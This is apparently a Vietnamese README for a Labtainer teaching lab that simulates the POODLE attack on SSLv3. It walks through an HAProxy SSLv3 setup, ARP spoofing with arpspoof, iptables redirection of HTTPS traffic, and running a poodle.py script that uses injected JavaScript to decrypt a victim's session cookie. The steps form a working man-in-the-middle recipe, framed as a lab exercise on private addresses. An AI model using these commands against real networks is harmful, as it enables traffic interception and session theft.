Tổng hợp một số lab an toàn thông tin được tạo với nền tảng Labtainer

Ptit_poodle_lab

Bài lab dựng trên nền tảng Labtainer, mô phỏng tấn công poodle attack, một lỗ hổng trong giao thức SSLv3 để có thể giải mã được dữ liệu mã hoá
Các images của bài lab đã được up trên nền tảng Dockerhub: https://hub.docker.com/u/ssaplliwi
Github hiện chỉ up file tar để chỉ dẫn tải lab, do không thể up quá dung lượng cho phép ở github, lab đầy đủ được upload tại: https://drive.google.com/file/d/1VVoBZB8guAfTdu1_JkxNJ65ukz_xqx7g/view?usp=sharing

Các bước thực hiện bài lab:
Tải bài lab: imodule https://github.com/ssaplliwi/labtainer/raw/refs/heads/main/ptit_poodle_lab.tar
<img width="1156" height="187" alt="image" src="https://github.com/user-attachments/assets/8e349563-5331-4c81-b75c-8d4e41b1cb12" />

Lệnh khởi động bài lab: labtainer -r ptit_poodle_lab
Khi đó, các images cần thiết sẽ được tải về máy:
<img width="990" height="553" alt="image" src="https://github.com/user-attachments/assets/d1a5297a-e703-4c79-b656-a13a4deccc02" />

Sau đó ta tiến hành khởi động các terminal cho các máy
<img width="1207" height="385" alt="image" src="https://github.com/user-attachments/assets/89dc32d4-bca0-417e-afbf-2b2a8aec5185" />

Trên server, sử dụng openssl để khởi tạo một chứng chỉ tự ký và cùng khóa bí mật vào một file

openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout ~/server.key \
    -out ~/server.crt \
    -subj "/CN=172.20.0.30"

cp ~/server.crt ~/server.pem
tee -a ~/server.pem < ~/server.key

Sau đó, cấu hình SSL Termination sử dụng giao thức lỗi thời SSLv3 qua HAProxy cho ứng dụng Python
python3 app.py &
sudo haproxy -f haproxy.cfg -db

với nội dung file cấu hình haproxy như sau:
<img width="911" height="481" alt="image" src="https://github.com/user-attachments/assets/f0ed9fb6-47d1-4649-96c7-939fe750a1e7" />

Từ máy attacker, ta thử kiểm tra giao thức mã hoá và ta có kết quả cùng Cookie nhận được như sau:
<img width="1533" height="737" alt="image" src="https://github.com/user-attachments/assets/a7b65f8b-42ab-4eb2-8d1e-3f6c509f8a86" />

Trên victim, sử dụng trình duyệt firefox để truy cập trang web của server:
<img width="948" height="402" alt="image" src="https://github.com/user-attachments/assets/aed2f359-2fcb-4ce4-808d-19311813cd4e" />

Với máy victim, ta có cookie như trên, từ đây, ta bắt đầu tiến hành tấn công từ máy attacker để có thể giải mã toàn bộ nội dung, ở đây có sự điều chỉnh sẵn để demo giải mã được từ vị trí byte của Cookie

Sử dụng ARP Spoofing để thực hiện MITM:
sudo arpspoof -i eth0 -t 172.20.0.10 172.20.0.30 > /dev/null 2>&1 &
sudo arpspoof -i eth0 -t 172.20.0.30 172.20.0.10 > /dev/null 2>&1 &

Cấu hình định tuyến và chặn lưu lượng
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
-> Cho phép chuyển tiếp gói tin
echo 0 | sudo tee /proc/sys/net/ipv4/conf/all/send_redirects
-> Tắt tính năng gửi ICMP Redirect: Ngăn không cho hệ điều hành của Attacker gửi thông báo cho victim để ẩn mình tốt hơn
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
-> Bẫy lưu lượng HTTPS: Lệnh này dùng tường lửa iptables để chặn tất cả các gói tin mã hóa HTTPS (đích đến ban đầu là cổng 443 của Server) và bẻ hướng (REDIRECT) chúng về cổng 8443 trên chính máy của Attacker. Đây là nơi mà script tấn công POODLE đang đợi sẵn
Khai thác lỗ hổng giải mã Cookie (POODLE Attack):
python3 ~/poodle.py https://172.20.0.30 \
    --listen-host 0.0.0.0 \
    --listen-port-tls 8443 \
    --listen-port-http 8000 \
    --start-offset 408
-> Attacker khởi tạo một Web Server tại cổng 8000 chứa mã độc JavaScript ngầm. Khi victim truy cập http://172.20.0.20:8000, đoạn mã JavaScript tự động thực thi trên trình duyệt của nạn nhân.
Mã JavaScript liên tục gửi các yêu cầu ẩn, trình duyệt của Victim tuân theo cơ chế mặc định, tự động đính kèm Cookie phiên vào các yêu cầu này, khi đó, toàn bộ các yêu cầu HTTPS trên bị iptables bẻ hướng về cổng 8443 của script poodle.py, script ép kết nối hạ cấp xuống SSLv3, sau đó liên tục thay đổi byte đệm (Padding) của khối mã hóa rồi gửi tới Server thật, dựa vào phản hồi (Oracle) từ Server, script giải mã thành công từng ký tự của Cookie (với vị trí bắt đầu được định vị bằng --start-offset 408) mà không cần khóa bí mật
<img width="916" height="393" alt="image" src="https://github.com/user-attachments/assets/1fe4feb4-c030-4b2b-a439-7934ff955a34" />

Khi đó, chỉ cần nạn nhân truy cập vào trang web độc hại của attacker, cuộc tấn công sẽ được diễn ra:
<img width="1591" height="881" alt="image" src="https://github.com/user-attachments/assets/f534af03-2897-4a07-ac6d-af785eaa1dcd" />

Như vậy, cookie của nạn nhân dần bị lộ ra, ở đây, lệnh tấn công đã được điều chỉnh để giải mã từ byte 408 (vị trí bắt đầu của cookie), như vậy đã chứng minh toàn bộ dữ liệu mã hoá đã có thể bị giải mã mà không cần khoá bí mật

Checkwork kiểm tra các kết quả đã làm trên hệ thống labtainer:
<img width="707" height="295" alt="image" src="https://github.com/user-attachments/assets/998d7152-46c0-415e-8ad1-8955aba3090b" />







